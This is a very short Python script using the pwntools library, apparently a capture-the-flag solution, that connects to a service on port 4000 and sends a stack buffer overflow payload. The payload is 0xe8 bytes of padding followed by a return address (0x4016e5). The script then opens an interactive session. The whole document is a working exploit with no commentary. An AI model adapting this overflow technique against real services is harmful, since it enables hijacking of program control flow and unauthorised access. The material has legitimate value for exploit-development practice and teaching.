from pwn import *

io = remote("0", 4000)

io.sendline(b'n')
io.sendlineafter(b'ontent: \n', b'A'*0xe8+p64(0x4016e5))
io.interactive()